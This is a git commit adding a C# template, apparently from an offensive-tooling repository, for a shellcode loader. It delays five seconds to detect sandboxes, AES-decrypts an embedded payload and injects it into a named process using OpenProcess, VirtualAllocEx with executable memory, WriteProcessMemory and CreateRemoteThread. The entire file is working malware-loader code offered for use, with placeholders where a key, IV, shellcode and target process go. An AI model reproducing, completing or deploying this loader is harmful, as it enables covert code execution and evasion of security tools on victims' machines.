dbffd0cc5dfcf1a1b2f594cfb84a58bc21ad4f9d
Octoberfest7 <91164728+Octoberfest7@users.noreply.github.com>
2021-09-21 16:46:27 -0700

    Add files via upload

---
+++ Runnerinject/Template.cs
@@ -0,0 +1,100 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.IO;
+using System.Security.Cryptography;
+
+namespace Runnerinject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
+        public static void Main()
+        {
+            DateTime t1 = DateTime.Now;
+            Sleep(5000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 4.5)
+            {
+                return;
+            }
+            <KEY>
+            <IV>
+            <SHELLCODE>
+            //Convert key to bytes
+            string[] c1 = MyKey.Split('-');
+            byte[] f = new byte[c1.Length];
+            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
+            //Convert IV to bytes
+            string[] d1 = Myiv.Split('-');
+            byte[] g = new byte[d1.Length];
+            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
+
+
+            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
+            // Remove dashes from string
+            string[] roundnodash = roundtrip.Split('-');
+            // Convert Decrypted shellcode back to bytes
+            byte[] e = new byte[roundnodash.Length];
+            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);
+
+            Process[] localByName = Process.GetProcessesByName("<PROCESS>");
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr outSize;
+            WriteProcessMemory(hProcess, addr, e, e.Length, out outSize);
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        }
+        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
+        {
+            // Check arguments.
+            if (cipherText == null || cipherText.Length <= 0)
+                throw new ArgumentNullException("cipherText");
+            if (Key == null || Key.Length <= 0)
+                throw new ArgumentNullException("Key");
+            if (IV == null || IV.Length <= 0)
+                throw new ArgumentNullException("IV");
+
+            // Declare the string used to hold
+            // the decrypted text.
+            string plaintext = null;
+
+            // Create an Aes object
+            // with the specified key and IV.
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Key;
+                aesAlg.IV = IV;
+
+                // Create a decryptor to perform the stream transform.
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                // Create the streams used for decryption.
+                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+
+                            // Read the decrypted bytes from the decrypting stream
+                            // and place them in a string.
+                            plaintext = srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+            }
+
+            return plaintext;
+        }
+    }
+}
